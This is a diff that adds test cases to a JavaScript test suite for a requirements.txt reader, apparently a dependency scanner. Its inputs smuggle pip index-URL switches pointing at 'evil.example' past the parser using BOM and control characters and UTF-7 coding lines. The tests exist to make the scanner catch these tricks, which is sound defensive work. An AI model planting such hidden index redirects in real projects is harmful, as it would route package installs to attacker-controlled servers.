@@ -1592,6 +1592,11 @@ test("requirements*.txt: a line that could name a source and is not one it can r
     "requests==2.0\r-i https://evil.example/SECRET/simple",
     "# a comment -i https://evil.example/SECRET/simple",
     "# a comment\f-i https://evil.example/SECRET/simple",
+    "-i https://pypi.org/simple \uFEFF# -i https://evil.example/SECRET/simple",
+    "--pre \uFEFF# -i https://evil.example/SECRET/simple",
+    "requests==2.0\uFEFF",
+    "# first\n\uFEFFrequests==2.0",
+    "requests==2.0 \u001f# -i https://evil.example/SECRET/simple",
     "${PACKAGE}==1.0",
     "requests @ https://${TOKEN}@evil.example/SECRET/x.whl",
     "--trusted-host ${HOST}",
@@ -1692,4 +1697,24 @@ test("requirements*.txt: a -r or -c file with only unpinned requirements was rea
     packages: [pypi("idna", "3.10", "requirements.txt", 2)],
     couldNotRead: [{ file: "requirements-ranges.txt", reason: "no pinned versions in it" }],
   });
+});
+
+test("requirements*.txt: a coding line in the first two lines naming anything but UTF-8 makes the file one it cannot read, as pip would decode it otherwise; a BOM wins over it", () => {
+  const odd = [
+    "# -*- coding: utf-7 -*-\n+AAo--i https://evil.example/SECRET/simple\nidna==3.10\n",
+    "idna==3.10\n# coding=latin-1\n",
+    "#coding:cp1252\r\nidna==3.10\r\n",
+  ];
+  for (const text of odd) {
+    const read = readPackages([{ path: "requirements.txt", text }]);
+    assert.deepEqual(read, { ...EMPTY, couldNotRead: [{ file: "requirements.txt", reason: "an encoding it cannot read" }] }, JSON.stringify(text));
+  }
+  const utf8 = ["# -*- coding: utf-8 -*-\nidna==3.10\n", "# coding=UTF8\nidna==3.10\n", "# vim: set fileencoding=utf_8 :\nidna==3.10\n",
+    "# coding: u8\nidna==3.10\n", "# coding: utf-8-sig\nidna==3.10\n", "\uFEFF# coding: utf-7\nidna==3.10\n",
+    "idna==3.10\n\n# coding: utf-7\n", "idna==3.10  # coding: utf-7\n"];
+  for (const text of utf8) {
+    const read = readPackages([{ path: "requirements.txt", text }]);
+    assert.deepEqual(read.packages.map((p) => p.name), ["idna"], JSON.stringify(text));
+    assert.deepEqual(read.couldNotRead, [], JSON.stringify(text));
+  }
 });
